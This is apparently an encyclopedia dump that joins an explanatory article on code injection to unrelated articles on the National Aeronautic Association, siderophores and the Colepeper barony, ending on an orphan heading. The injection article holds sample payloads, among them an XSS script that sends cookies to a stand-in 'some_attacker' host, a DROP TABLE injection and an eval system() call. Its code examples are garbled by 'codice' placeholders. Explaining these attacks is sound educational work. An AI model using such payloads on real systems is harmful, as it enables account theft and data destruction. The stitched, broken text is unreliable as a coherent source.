Code injection vulnerabilities occur when an application sends untrusted data to an interpreter, which then executes the injected text as code. Injection flaws are often found in services like Structured Query Language (SQL) databases, Extensible Markup Language (XML) parsers, operating system commands, Simple Mail Transfer Protocol (SMTP) headers, and other program arguments. Injection flaws can be identified through source code examination, Static analysis, or dynamic testing methods such as fuzzing.

There are numerous types of code injection vulnerabilities, but most are errors in interpretation—they treat benign user input as code or fail to distinguish input from system commands. Many examples of interpretation errors can exist outside of computer science, such as the comedy routine &quot;Who&#x27;s on First?&quot;. Code injection can be used maliciously for many purposes, including: 
* Arbitrarily modifying values in a database through SQL injection; the impact of this can range from website defacement to serious compromise of sensitive data. For more information, see Arbitrary code execution.
* Installing malware or executing malevolent code on a server by injecting server scripting code (such as PHP).
* Privilege escalation to either superuser permissions on UNIX by exploiting shell injection vulnerabilities in a binary file or to Local System privileges on Microsoft Windows by exploiting a service within Windows.
* Attacking web users with Hyper Text Markup Language (HTML) or Cross-Site Scripting (XSS) injection.
Code injections that target the Internet of Things could also lead to severe consequences such as data breaches and service disruption.

Code injections can occur on any type of program running with an interpreter. Doing this is trivial to most, and one of the primary reasons why server software is kept away from users. An example of how you can see code injection first-hand is to use your browser&#x27;s developer tools.

Code injection vulnerabilities are recorded by the National Institute of Standards and Technology (NIST) in the National Vulnerability Database (NVD) as CWE-94. Code injection peaked in 2008 at 5.66% as a percentage of all recorded vulnerabilities.

==Benign and unintentional use==
Code injection may be done with good intentions. For example, changing or tweaking the behavior of a program or system through code injection can cause the system to behave in a certain way without malicious intent. Code injection could, for example:
* Introduce a useful new column that did not appear in the original design of a search results page.
* Offer a new way to filter, order, or group data by using a field not exposed in the default functions of the original design.
* Add functionality like connecting to online resources in an offline program.
* Override a function, making calls redirect to another implementation. This can be done with the Dynamic linker in Linux.

Some users may unsuspectingly perform code injection because the input they provided to a program was not considered by those who originally developed the system. For example:
* What the user may consider as valid input may contain token characters or strings that have been reserved by the developer to have special meaning (such as the ampersand or quotation marks).
* The user may submit a malformed file as input that is handled properly in one application but is toxic to the receiving system.
Another benign use of code injection is the discovery of injection flaws to find and fix vulnerabilities. This is known as a penetration test.

==Preventing Code Injection==
To prevent code injection problems, the person could use secure input and output handling strategies, such as:
* Using an application programming interface (API) that, if used properly, is secure against all input characters. Parameterized queries allow the moving of user data out of a string to be interpreted. Additionally, Criteria API and similar APIs move away from the concept of command strings to be created and interpreted.
* Enforcing language separation via a static type system.
* Validating or &quot;sanitizing&quot; input, such as whitelisting known good values. This can be done on the client side, which is prone to modification by malicious users, or on the server side, which is more secure.
* Encoding input or escaping dangerous characters. For instance, in PHP, using the codice_1 function to escape special characters for safe output of text in HTML and the codice_2 function to isolate data which will be included in an SQL request can protect against SQL injection.
* Encoding output, which can be used to prevent XSS attacks against website visitors.
* Using the codice_3 flag for HTTP cookies. When this flag is set, it does not allow client-side script interaction with cookies, thereby preventing certain XSS attacks.
* Modular shell disassociation from the kernel.
* Regarding SQL injection, one can use parameterized queries, stored procedures, whitelist input validation, and other approaches to help mitigate the risk of an attack. Using object-relational mapping can further help prevent users from directly manipulating SQL queries.

The solutions described above deal primarily with web-based injection of HTML or script code into a server-side application. Other approaches must be taken, however, when dealing with injections of user code on a user-operated machine, which often results in privilege elevation attacks. Some approaches that are used to detect and isolate managed and unmanaged code injections are:
* Runtime image hash validation, which involves capturing the hash of a partial or complete image of the executable loaded into memory and comparing it with stored and expected hashes.
* NX bit: all user data is stored in special memory sections that are marked as non-executable. The processor is made aware that no code exists in that part of memory and refuses to execute anything found in there.
* Use canaries, which are randomly placed values in a stack. At runtime, a canary is checked when a function returns. If a canary has been modified, the program stops execution and exits. This occurs on a failed Stack Overflow Attack.
* Code Pointer Masking (CPM): after loading a (potentially changed) code pointer into a register, the user can apply a bitmask to the pointer. This effectively restricts the addresses to which the pointer can refer. This is used in the C programming language.

==Examples==

===SQL injection===

An SQL injection takes advantage of SQL syntax to inject malicious commands that can read or modify a database or compromise the meaning of the original query.

For example, consider a web page that has two text fields which allow users to enter a username and a password. The code behind the page will generate an SQL query to check the password against the list of user names:

SELECT UserList.Username
FROM UserList
WHERE UserList.Username = &#x27;Username&#x27;
AND UserList.Password = &#x27;Password&#x27;

If this query returns any rows, then access is granted. However, if the malicious user enters a valid Username and injects some valid code &quot;codice_4 in the Password field, then the resulting query will look like this:

SELECT UserList.Username
FROM UserList
WHERE UserList.Username = &#x27;Username&#x27;
AND UserList.Password = &#x27;Password&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;

In the example above, &quot;Password&quot; is assumed to be blank or some innocuous string. &quot;codice_5&quot; will always be true and many rows will be returned, thereby allowing access.

The technique may be refined to allow multiple statements to run or even to load up and run external programs.

Assume a query with the following format:
SELECT User.UserID
FROM User
WHERE User.UserID = &#x27; &quot; + UserID + &quot; &#x27;
AND User.Pwd = &#x27; &quot; + Password + &quot; &#x27;
If an adversary has the following for inputs:

codice_6

codice_7

then the query will be parsed as:
SELECT User.UserID
FROM User
WHERE User.UserID = &quot;;DROP TABLE User; --&#x27;AND Pwd = &quot;OR&quot;=&#x27;
The resulting codice_8 table will be removed from the database. This occurs because the codice_9 symbol signifies the end of one command and the start of a new one. codice_10 signifies the start of a comment.

=== Cross-site scripting ===

Code injection is the malicious injection or introduction of code into an application. Some web servers have a guestbook script, which accepts small messages from users and typically receives messages such as:
 Very nice site!
However, a malicious person may know of a code injection vulnerability in the guestbook and enter a message such as:
Nice site, I think I&#x27;ll take it. &lt;script&gt;window.location=&quot;https://some_attacker/evilcgi/cookie.cgi?steal=&quot; + escape(document.cookie)&lt;/script&gt;
If another user views the page, then the injected code will be executed. This code can allow the attacker to impersonate another user. However, this same software bug can be accidentally triggered by an unassuming user, which will cause the website to display bad HTML code.

HTML and script injection are popular subjects, commonly termed &quot;cross-site scripting&quot; or &quot;XSS&quot;. XSS refers to an injection flaw whereby user input to a web script or something along such lines is placed into the output HTML without being checked for HTML code or scripting.

Many of these problems are related to erroneous assumptions of what input data is possible or the effects of special data.

=== Server Side Template Injection ===
Template engines are often used in modern web applications to display dynamic data. However, trusting non-validated user data can frequently lead to critical vulnerabilities such as server-side Side Template Injections. While this vulnerability is similar to cross-site scripting, template injection can be leveraged to execute code on the web server rather than in a visitor&#x27;s browser. It abuses a common workflow of web applications, which often use user inputs and templates to render a web page. The example below shows the concept. Here the template codice_11 is replaced with data during the rendering process.
Hello 

An attacker can use this workflow to inject code into the rendering pipeline by providing a malicious codice_12. Depending on the implementation of the web application, he could choose to inject codice_11 which the renderer could resolve to codice_14. Note that the actual web server has evaluated the malicious code and therefore could be vulnerable to remote code execution.

===Dynamic evaluation vulnerabilities===
An eval() injection vulnerability occurs when an attacker can control all or part of an input string that is fed into an eval() function call.

$myvar = &#x27;somevalue&#x27;;
$x = $_GET[&#x27;arg&#x27;];
eval(&#x27;$myvar = &#x27; . $x . &#x27;;&#x27;);

The argument of &quot;codice_15&quot; will be processed as PHP, so additional commands can be appended. For example, if &quot;arg&quot; is set to &quot;10; system(&#x27;/bin/echo uh-oh&#x27;)&quot;, additional code is run which executes a program on the server, in this case &quot;codice_16&quot;.

===Object injection===
PHP allows serialization and deserialization of whole objects. If an untrusted input is allowed into the deserialization function, it is possible to overwrite existing classes in the program and execute malicious attacks. Such an attack on Joomla was found in 2013.

=== Remote file injection ===

Consider this PHP program (which includes a file specified by request):

&lt;?php
$color = &#x27;blue&#x27;;
if (isset($_GET[&#x27;color&#x27;]))
 $color = $_GET[&#x27;color&#x27;];
require($color . &#x27;.php&#x27;);
The example expects a color to be provided, while attackers might provide codice_17 causing PHP to load the remote file.

=== Format specifier injection ===
Format string bugs appear most commonly when a programmer wishes to print a string containing user-supplied data. The programmer may mistakenly write codice_18 instead of codice_19. The first version interprets codice_20 as a format string and parses any formatting instructions it may contain. The second version simply prints a string to the screen, as the programmer intended. Consider the following short C program that has a local variable char array codice_21 which holds a password; the program asks the user for an integer and a string, then echoes out the user-provided string.
 char user_input[100];
 int int_in;
 char password[10] = &quot;Password1&quot;;

 printf(&quot;Enter an integer\n&quot;);
 scanf(&quot;%d&quot;, &amp;int_in);
 printf(&quot;Please enter a string\n&quot;);
 fgets(user_input, sizeof(user_input), stdin);

 printf(user_input); // Safe version is: printf(&quot;%s&quot;, user_input);
 printf(&quot;\n&quot;);

 return 0;
If the user input is filled with a list of format specifiers, such as codice_22, then codice_23will start reading from the stack. Eventually, one of the codice_24 format specifiers will access the address of codice_21, which is on the stack, and print codice_26 to the screen.

===Shell injection===
Shell injection (or command injection) is named after UNIX shells but applies to most systems that allow software to programmatically execute a command line. Here is an example vulnerable tcsh script:

!/bin/tcshcheck arg outputs it matches if arg is one
if ($1 == 1) echo it matches

If the above is stored in the executable file codice_27, the shell command codice_28 will attempt to execute the injected shell command codice_29 instead of comparing the argument with the constant one. Here, the code under attack is the code that is trying to check the parameter, the very code that might have been trying to validate the parameter to defend against an attack.

Any function that can be used to compose and run a shell command is a potential vehicle for launching a shell injection attack. Among these are codice_30, codice_31, and codice_32.

Client-server systems such as web browser interaction with web servers are potentially vulnerable to shell injection. Consider the following short PHP program that can run on a web server to run an external program called codice_33 to replace a word the user sent with some other word.
&lt;?php
passthru(&quot;/bin/funnytext &quot; . $_GET[&#x27;USER_INPUT&#x27;]);
The codice_34 function in the above program composes a shell command that is then executed by the web server. Since part of the command it composes is taken from the URL provided by the web browser, this allows the URL to inject malicious shell commands. One can inject code into this program in several ways by exploiting the syntax of various shell features (this list is not exhaustive):

Some languages offer functions to properly escape or quote strings that are used to construct shell commands:
* PHP: codice_35 and codice_36
* Python: codice_37
However, this still puts the burden on programmers to know/learn about these functions and to remember to make use of them every time they use shell commands. In addition to using these functions, validating or sanitizing the user input is also recommended.

A safer alternative is to use APIs that execute external programs directly rather than through a shell, thus preventing the possibility of shell injection. However, these APIs tend to not support various convenience features of shells and/or to be more cumbersome/verbose compared to concise shell syntax.

<doc id="1065474" wikidata="Q6970194" url="?curid=1065474" title="National Aeronautic Association">
<text>The National Aeronautic Association of the United States (NAA) is a non-profit 501(c)(3) organization and a founding member of the Fédération Aéronautique Internationale (FAI). Founded in 1905, it is the oldest national aviation club in the United States and one of the oldest in the world, it serves as the “Aeroclub of the United States” and, by its Mission Statement it is &quot;…dedicated to the advancement of the art, sport and science of aviation in the United States.” The NAA is headquartered at the Ronald Reagan Washington National Airport, in Washington, D.C.

==History==
The NAA was founded in 1905, as the Aero Club of America (ACA), by members of the Automobile Club of America. From its inception, ACA’s goal was to promote aviation in any way possible, as both a sport and a commercial endeavor. In 1922, it was incorporated as the Aero Club’s successor, and continued the original group’s mission of promoting aviation. The NAA has been steeply involved with the growth of aviation in the United States almost since its beginning, to the point of being the sole issuer of pilot licenses in American until the Civil Aeronautics Act of 1926. The Chairman of the NAA is James Albaugh. The President and Chief Executive Officer of the NAA is Greg Principato.

==The NAA and the Fédération Aéronautique Internationale==
In 1905, the NAA joined Germany, Spain, Belgium, the United Kingdom, Italy, Switzerland, and France to create an international aviation organizationFédération Aéronautique Internationalewith the goal of fostering aeronautical activities worldwide. FAI is the organization responsible for establishing the rules for record-setting and competition, and also for recognizing international achievements in aeronautics and astronautics.

The NAA is the largest member of FAI and is responsible for appointing representatives to 15 major air sport and technical committees of FAI. The NAA also represents U.S. interests in aviation at the FAI’s Annual General Conference.

==Mission==
The NAA has three distinct responsibilities: The recording and certification of Aviation and Aerospace Records, the administration of Aviation Trophies and Awards, and working with Air Sports Organizations in America on the advancement of their individual sports.

==Aviation and aerospace records==
The NAA has certified aviation and aerospace records in the United States since 1905. Its records database counts over 8,000 record flights to include those of balloons, airships, airplanes, (landplanes, seaplanes, amphibians, very light jets,) gliders, helicopters, autogiros, model aircraft, parachutes, human powered aircraft, spacecraft, tilt-wing/tilt-engine aircraft, hang gliders, paragliders, microlights, space models, and UAVs. In addition, the NAA certifies a wide variety of records including altitude, time-to-climb, distance, speed, greatest payload carried, and efficiency. As the U.S. representative to FAI, the National Aeronautic Association is the sole authority for overseeing and certifying all aviation records that take place within the United States. On average, the NAA certifies 150 records each year. The NAA records process is directed by the NAA Contest and Records Board and managed by the NAA Director of Contest and Records, Arthur W. Greenfield. It is easy to carry out a record attempt with an ordinary plane, but there is some paperwork and verification involved.

<doc id="1065475" wikidata="Q424747" url="?curid=1065475" title="Siderophore">
<text>Siderophores (Greek: &quot;iron carrier&quot;) are small, high-affinity iron-chelating compounds that are secreted by microorganisms such as bacteria and fungi. They help the organism accumulate iron. Although a widening range of siderophore functions is now being appreciated, siderophores are among the strongest (highest affinity) Fe3+ binding agents known. Phytosiderophores are siderophores produced by plants.

==Scarcity of soluble iron==
Despite being one of the most abundant elements in the Earth&#x27;s crust, iron is not readily bioavailable. In most aerobic environments, such as the soil or sea, iron exists in the ferric (Fe3+) state, which tends to form insoluble rust-like solids. To be effective, nutrients must not only be available, they must be soluble. Microbes release siderophores to scavenge iron from these mineral phases by formation of soluble Fe3+ complexes that can be taken up by active transport mechanisms. Many siderophores are nonribosomal peptides, although several are biosynthesised independently.

Siderophores are also important for some pathogenic bacteria for their acquisition of iron. In mammalian hosts, iron is tightly bound to proteins such as hemoglobin, transferrin, lactoferrin and ferritin. The strict homeostasis of iron leads to a free concentration of about 10−24 mol L−1, hence there are great evolutionary pressures put on pathogenic bacteria to obtain this metal. For example, the anthrax pathogen &quot;Bacillus anthracis&quot; releases two siderophores, bacillibactin and petrobactin, to scavenge ferric ion from iron containing proteins. While bacillibactin has been shown to bind to the immune system protein siderocalin, petrobactin is assumed to evade the immune system and has been shown to be important for virulence in mice.

Siderophores are amongst the strongest binders to Fe3+ known, with enterobactin being one of the strongest of these. Because of this property, they have attracted interest from medical science in metal chelation therapy, with the siderophore desferrioxamine B gaining widespread use in treatments for iron poisoning and thalassemia.

Besides siderophores, some pathogenic bacteria produce &quot;hemophores&quot; (heme binding scavenging proteins) or have receptors that bind directly to iron/heme proteins. In eukaryotes, other strategies to enhance iron solubility and uptake are the acidification of the surroundings (e.g. used by plant roots) or the extracellular reduction of Fe3+ into the more soluble Fe2+ ions.

== Structure ==
Siderophores usually form a stable, hexadentate, octahedral complex preferentially with Fe3+ compared to other naturally occurring abundant metal ions, although if there are fewer than six donor atoms water can also coordinate. The most effective siderophores are those that have three bidentate ligands per molecule, forming a hexadentate complex and causing a smaller entropic change than that caused by chelating a single ferric ion with separate ligands. Fe3+ is a strong Lewis acid, preferring strong Lewis bases such as anionic or neutral oxygen atoms to coordinate with. Microbes usually release the iron from the siderophore by reduction to Fe2+ which has little affinity to these ligands.

Siderophores are usually classified by the ligands used to chelate the ferric iron. The major groups of siderophores include the catecholates (phenolates), hydroxamates and carboxylates (e.g. derivatives of citric acid). Citric acid can also act as a siderophore. The wide variety of siderophores may be due to evolutionary pressures placed on microbes to produce structurally different siderophores which cannot be transported by other microbes&#x27; specific active transport systems, or in the case of pathogens deactivated by the host organism.

==Diversity==
Examples of siderophores produced by various bacteria and fungi:
 


Hydroxamate siderophores
Catecholate siderophores
Mixed ligands
Amino carboxylate ligands
A comprehensive list of siderophore structures (over 250) is presented in Appendix 1 in reference.

==Biological function==

===Bacteria and fungi===
In response to iron limitation in their environment, genes involved in microbe siderophore production and uptake are derepressed, leading to manufacture of siderophores and the appropriate uptake proteins. In bacteria, Fe2+-dependent repressors bind to DNA upstream to genes involved in siderophore production at high intracellular iron concentrations. At low concentrations, Fe2+ dissociates from the repressor, which in turn dissociates from the DNA, leading to transcription of the genes. In gram-negative and AT-rich gram-positive bacteria, this is usually regulated by the &quot;Fur&quot; (ferric uptake regulator) repressor, whilst in GC-rich gram-positive bacteria (e.g. Actinomycetota) it is &quot;DtxR&quot; (diphtheria toxin repressor), so-called as the production of the dangerous diphtheria toxin by &quot;Corynebacterium diphtheriae&quot; is also regulated by this system.

This is followed by excretion of the siderophore into the extracellular environment, where the siderophore acts to sequester and solubilize the iron. Siderophores are then recognized by cell specific receptors on the outer membrane of the cell. In fungi and other eukaryotes, the Fe-siderophore complex may be extracellularly reduced to Fe2+, while in many cases the whole Fe-siderophore complex is actively transported across the cell membrane. In gram-negative bacteria, these are transported into the periplasm via TonB-dependent receptors, and are transferred into the cytoplasm by ABC transporters.

Once in the cytoplasm of the cell, the Fe3+-siderophore complex is usually reduced to Fe2+ to release the iron, especially in the case of &quot;weaker&quot; siderophore ligands such as hydroxamates and carboxylates. Siderophore decomposition or other biological mechanisms can also release iron, especially in the case of catecholates such as ferric-enterobactin, whose reduction potential is too low for reducing agents such as flavin adenine dinucleotide, hence enzymatic degradation is needed to release the iron.

===Plants===

Although there is sufficient iron in most soils for plant growth, plant iron deficiency is a problem in calcareous soil, due to the low solubility of iron(III) hydroxide. Calcareous soil accounts for 30% of the world&#x27;s farmland. Under such conditions graminaceous plants (grasses, cereals and rice) secrete phytosiderophores into the soil, a typical example being deoxymugineic acid. Phytosiderophores have a different structure to those of fungal and bacterial siderophores having two α-aminocarboxylate binding centres, together with a single α-hydroxycarboxylate unit. This latter bidentate function provides phytosiderophores with a high selectivity for iron(III). When grown in an iron -deficient soil, roots of graminaceous plants secrete siderophores into the rhizosphere. On scavenging iron(III) the iron–phytosiderophore complex is transported across the cytoplasmic membrane using a proton symport mechanism. The iron(III) complex is then reduced to iron(II) and the iron is transferred to nicotianamine, which although very similar to the phytosiderophores is selective for iron(II) and is not secreted by the roots. Nicotianamine translocates iron in phloem to all plant parts.

=== Chelating in &quot;Pseudomonas aeruginosa&quot; ===
Iron is an important nutrient for the bacterium &quot;Pseudomonas aeruginosa&quot;, however, iron is not easily accessible in the environment. To overcome this problem, &quot;P. aeruginosa&quot; produces siderophores to bind and transport iron. But the bacterium that produced the siderophores does not necessarily receive the direct benefit of iron intake. Rather all members of the cellular population are equally likely to access the iron-siderophore complexes. The production of siderophores also requires the bacterium to expend energy. Thus, siderophore production can be looked at as an altruistic trait because it is beneficial for the local group but costly for the individual. This altruistic dynamic requires every member of the cellular population to equally contribute to siderophore production. But at times mutations can occur that result in some bacteria producing lower amounts of siderophore. These mutations give an evolutionary advantage because the bacterium can benefit from siderophore production without suffering the energy cost. Thus, more energy can be allocated to growth. Members of the cellular population that can efficiently produce these siderophores are commonly referred to as cooperators; members that produce little to no siderophores are often referred to as cheaters. Research has shown when cooperators and cheaters are grown together, cooperators have a decrease in fitness while cheaters have an increase in fitness. It is observed that the magnitude of change in fitness increases with increasing iron-limitation. With an increase in fitness, the cheaters can outcompete the cooperators; this leads to an overall decrease in fitness of the group, due to lack of sufficient siderophore production.

=== Pyoverdine and siderophore production in &quot;Pseudomonas aeruginosa&quot; ===
In a recent study, the production of pyoverdine (PVD), a type of siderophore, in the bacterium Pseudomonas aeruginosa has been explored. This study focused on the construction, modeling, and dynamic simulation of PVD biosynthesis, a virulence factor, through a systemic approach. This approach considers that the metabolic pathway of PVD synthesis is regulated by the phenomenon of quorum-sensing (QS), a cellular communication system that allows bacteria to coordinate their behavior based on their population density.

The study showed that as bacterial growth increases, so does the extracellular concentration of QS signaling molecules, thus emulating the natural behavior of P. aeruginosa PAO1. To carry out this study, a metabolic network model of P. aeruginosa was built based on the iMO1056 model, the genomic annotation of the P. aeruginosa PAO1 strain, and the metabolic pathway of PVD synthesis. This model included the synthesis of PVD, transport reactions, exchange, and QS signaling molecules.

The resulting model, called CCBM1146, showed that the QS phenomenon directly influences the metabolism of P. aeruginosa towards the biosynthesis of PVD as a function of the change in QS signal intensity. This work is the first &quot;in silico&quot; report of an integrative model that comprises the QS gene regulatory network and the metabolic network of P. aeruginosa, providing a detailed view of how the production of pyoverdine and siderophores in Pseudomonas aeruginosa are influenced by the quorum-sensing phenomenon

Furthermore, intratumor &quot;P. aeruginosa&quot; may scavenge iron by producing pyoverdine, which indirectly protect tumor cells from ferroptosis (&#x27;iron death&#x27;), emphasizing the need for ferroptosis inducers (thiostrepton) for cancer treatment.

==Ecology==
Siderophores become important in the ecological niche defined by low iron availability, iron being one of the critical growth limiting factors for virtually all aerobic microorganisms. There are four major ecological habitats: soil and surface water, marine water, plant tissue (pathogens) and animal tissue (pathogens).

===Soil and surface water===
The soil is a rich source of bacterial and fungal genera. Common Gram-positive species are those belonging to the Actinomycetales and species of the genera &quot;Bacillus&quot;, &quot;Arthrobacter&quot; and &quot;Nocardia&quot;. Many of these organisms produce and secrete ferrioxamines which lead to growth promotion of not only the producing organisms, but also other microbial populations that are able to utilize exogenous siderophores. Soil fungi include &quot;Aspergillus&quot; and &quot;Penicillium&quot; predominantly produce ferrichromes. This group of siderophores consist of cyclic hexapeptides and consequently are highly resistant to environmental degradation associated with the wide range of hydrolytic enzymes that are present in humic soil. Soils containing decaying plant material possess pH values as low as 3–4. Under such conditions organisms that produce hydroxamate siderophores have an advantage due to the extreme acid stability of these molecules. The microbial population of fresh water is similar to that of soil, indeed many bacteria are washed out from the soil. In addition, fresh-water lakes contain large populations of &quot;Pseudomonas&quot;, &quot;Azomonas&quot;, &quot;Aeromonas&quot; and &quot;Alcaligenes&quot; species. As siderophores are secreted into the surroundings, siderophores can be detected by bacterivorous predators, including &quot;Caenorhabditis elegans&quot;, resulting in the nematode migration to the bacterial prey.

===Marine water===
In contrast to most fresh-water sources, iron levels in surface sea-water are extremely low (1 nM to 1 μM in the upper 200 m) and much lower than those of V, Cr, Co, Ni, Cu and Zn. Virtually all this iron is in the iron(III) state and complexed to organic ligands. These low levels of iron limit the primary production of phytoplankton and have led to the Iron Hypothesis where it was proposed that an influx of iron would promote phytoplankton growth and thereby reduce atmospheric CO2. This hypothesis has been tested on more than 10 different occasions and in all cases, massive blooms resulted. However, the blooms persisted for variable periods of time. An interesting observation made in some of these studies was that the concentration of the organic ligands increased over a short time span in order to match the concentration of added iron, thus implying biological origin and in view of their affinity for iron possibly being of a siderophore or siderophore-like nature. Significantly, heterotrophic bacteria were also found to markedly increase in number in the iron-induced blooms. Thus there is the element of synergism between phytoplankton and heterotrophic bacteria. Phytoplankton require iron (provided by bacterial siderophores), and heterotrophic bacteria require non-CO2 carbon sources (provided by phytoplankton).

The dilute nature of the pelagic marine environment promotes large diffusive losses and renders the efficiency of the normal siderophore-based iron uptake strategies problematic. However, many heterotrophic marine bacteria do produce siderophores, albeit with properties different from those produced by terrestrial organisms. Many marine siderophores are surface-active and tend to form molecular aggregates, for example aquachelins. The presence of the fatty acyl chain renders the molecules with a high surface activity and an ability to form micelles. Thus, when secreted, these molecules bind to surfaces and to each other, thereby slowing the rate of diffusion away from the secreting organism and maintaining a relatively high local siderophore concentration. Phytoplankton have high iron requirements and yet the majority (and possibly all) do not produce siderophores. Phytoplankton can, however, obtain iron from siderophore complexes by the aid of membrane-bound reductases and certainly from iron(II) generated via photochemical decomposition of iron(III) siderophores. Thus a large proportion of iron (possibly all iron) absorbed by phytoplankton is dependent on bacterial siderophore production.

===Plant pathogens===

Most plant pathogens invade the apoplasm by releasing pectolytic enzymes which facilitate the spread of the invading organism. Bacteria frequently infect plants by gaining entry to the tissue via the stomata. Having entered the plant they spread and multiply in the intercellular spaces. With bacterial vascular diseases, the infection is spread within the plants through the xylem.

Once within the plant, the bacteria need to be able to scavenge iron from the two main iron-transporting ligands, nicotianamine and citrate. To do this they produce siderophores, thus the enterobacterial &quot;Erwinia chrysanthemi&quot; produces two siderophores, chrysobactin and achromobactin. &quot;Xanthomonas&quot; group of plant pathogens produce xanthoferrin siderophores to scavenge the iron.

Like in humans, plants also possess siderophore binding proteins involved in host defense, like the major birch pollen allergen, Bet v 1, which are usually secreted and possess a lipocalin-like structure.

===Animal pathogens===
Pathogenic bacteria and fungi have developed the means of survival in animal tissue. They may invade the gastro-intestinal tract (&quot;Escherichia&quot;, &quot;Shigella&quot; and &quot;Salmonella&quot;), the lung (&quot;Pseudomonas&quot;, &quot;Bordetella&quot;, &quot;Streptococcus&quot; and &quot;Corynebacterium&quot;), skin (&quot;Staphylococcus&quot;) or the urinary tract (&quot;Escherichia&quot; and &quot;Pseudomonas&quot;). Such bacteria may colonise wounds (&quot;Vibrio&quot; and &quot;Staphylococcus&quot;) and be responsible for septicaemia (&quot;Yersinia&quot; and &quot;Bacillus&quot;). Some bacteria survive for long periods of time in intracellular organelles, for instance &quot;Mycobacterium&quot;. (see table). Because of this continual risk of bacterial and fungal invasion, animals have developed a number of lines of defence based on immunological strategies, the complement system, the production of iron–siderophore binding proteins and the general &quot;withdrawal&quot; of iron.

There are two major types of iron-binding proteins present in most animals that provide protection against microbial invasion – extracellular protection is achieved by the transferrin family of proteins and intracellular protection is achieved by ferritin. Transferrin is present in the serum at approximately 30 μM, and contains two iron-binding sites, each with an extremely high affinity for iron. Under normal conditions it is about 25–40% saturated, which means that any freely available iron in the serum will be immediately scavenged – thus preventing microbial growth. Most siderophores are unable to remove iron from transferrin. Mammals also produce lactoferrin, which is similar to serum transferrin but possesses an even higher affinity for iron. Lactoferrin is present in secretory fluids, such as sweat, tears and milk, thereby minimising bacterial infection.

Ferritin is present in the cytoplasm of cells and limits the intracellular iron level to approximately 1 μM. Ferritin is a much larger protein than transferrin and is capable of binding several thousand iron atoms in a nontoxic form. Siderophores are unable to directly mobilise iron from ferritin.

In addition to these two classes of iron-binding proteins, a hormone, hepcidin, is involved in controlling the release of iron from absorptive enterocytes, iron-storing hepatocytes and macrophages. Infection leads to inflammation and the release of interleukin-6 (IL-6 ) which stimulates hepcidin expression. In humans, IL-6 production results in low serum iron, making it difficult for invading pathogens to infect. Such iron depletion has been demonstrated to limit bacterial growth in both extracellular and intracellular locations.

In addition to &quot;iron withdrawal&quot; tactics, mammals produce an iron –siderophore binding protein, siderochelin. Siderochelin is a member of the lipocalin family of proteins, which while diverse in sequence, displays a highly conserved structural fold, an 8-stranded antiparallel β-barrel that forms a binding site with several adjacent β-strands. Siderocalin (lipocalin 2) has 3 positively charged residues also located in the hydrophobic pocket, and these create a high affinity binding site for iron(III)–enterobactin. Siderocalin is a potent bacteriostatic agent against &quot;E. coli&quot;. As a result of infection it is secreted by both macrophages and hepatocytes, enterobactin being scavenged from the extracellular space.

==Medical applications==
Siderophores have applications in medicine for iron and aluminum overload therapy and antibiotics for improved targeting. Understanding the mechanistic pathways of siderophores has led to opportunities for designing small-molecule inhibitors that block siderophore biosynthesis and therefore bacterial growth and virulence in iron-limiting environments.

Siderophores are useful as drugs in facilitating iron mobilization in humans, especially in the treatment of iron diseases, due to their high affinity for iron. One potentially powerful application is to use the iron transport abilities of siderophores to carry drugs into cells by preparation of conjugates between siderophores and antimicrobial agents. Because microbes recognize and utilize only certain siderophores, such conjugates are anticipated to have selective antimicrobial activity. An example is the cephalosporin antibiotic cefiderocol.

Microbial iron transport (siderophore)-mediated drug delivery makes use of the recognition of siderophores as iron delivery agents in order to have the microbe assimilate siderophore conjugates with attached drugs. These drugs are lethal to the microbe and cause the microbe to apoptosise when it assimilates the siderophore conjugate. Through the addition of the iron-binding functional groups of siderophores into antibiotics, their potency has been greatly increased. This is due to the siderophore-mediated iron uptake system of the bacteria.

==Agricultural applications==
Poaceae (grasses) including agriculturally important species such as barley and wheat are able to efficiently sequester iron by releasing phytosiderophores via their root into the surrounding soil rhizosphere. Chemical compounds produced by microorganisms in the rhizosphere can also increase the availability and uptake of iron. Plants such as oats are able to assimilate iron via these microbial siderophores. It has been demonstrated that plants are able to use the hydroxamate-type siderophores ferrichrome, rhodotorulic acid and ferrioxamine B; the catechol-type siderophores, agrobactin; and the mixed ligand catechol-hydroxamate-hydroxy acid siderophores biosynthesized by saprophytic root-colonizing bacteria. All of these compounds are produced by rhizospheric bacterial strains, which have simple nutritional requirements, and are found in nature in soils, foliage, fresh water, sediments, and seawater.

Fluorescent pseudomonads have been recognized as biocontrol agents against certain soil-borne plant pathogens. They produce yellow-green pigments (pyoverdines) which fluoresce under UV light and function as siderophores. They deprive pathogens of the iron required for their growth and pathogenesis.

==Other metal ions chelated==
Siderophores, natural or synthetic, can chelate metal ions other than iron ions. Examples include aluminium, gallium, chromium, copper, zinc, lead, manganese, cadmium, vanadium, zirconium, indium, plutonium, berkelium, californium, and uranium.

==Related processes==
Alternative means of assimilating iron are surface reduction, lowering of pH, utilization of heme, or extraction of protein-complexed metal. Recent data suggest that iron-chelating molecules with similar properties to siderophores, were produced by marine bacteria under phosphate limiting growth condition. In nature phosphate binds to different type of iron minerals, and therefore it was hypothesized that bacteria can use siderophore-like molecules to dissolve such complex in order to access the phosphate.

<text>Baron Colepeper is an extinct title in the Peerage of England. Colepeper is sometimes rendered &quot;Culpeper&quot;, Baron Colepeper of Thoresway, or Baron Thoresway. The barony was created in 1644 and became extinct following the death of the fourth baron in 1725.

All Saints Church, Hollingbourne, Kent, contains numerous monuments and memorials to the Culpeper family, owners of Leeds Castle and Hollingbourne Manor. These include the first, third and fourth Barons Colepeper: John Colpeper (&quot;d&quot;. 1660), John Colepeper (&quot;d&quot;. 1719) and Cheny Colepeper (&quot;d&quot;. 1725). The memorials for the third and fourth barons are by John Michael Rysbrack.

==Barons Colepeper (1640 or 1644)==
* John Colepeper, 1st Baron Colepeper (died 11 June 1660) 
* Thomas Colepeper, 2nd Baron Colepeper (1635–1689)
* John Colepeper, 3rd Baron of Colepeper
* Cheney Colepeper, 4th Baron Colepeper

==North American history==
The title was held by several members of the Colepeper family who controlled land in the North American Colony of Virginia, in particular the Northern Neck. In the context of Colonial history in North America, the family is often recorded as Culpeper. Culpeper County, Virginia is named for colonial governor of Virginia Thomas Colepeper, 2nd Baron Colepeper; his only surviving daughter, Catherine Culpeper; or another close relative.

==Sequel trilogy==
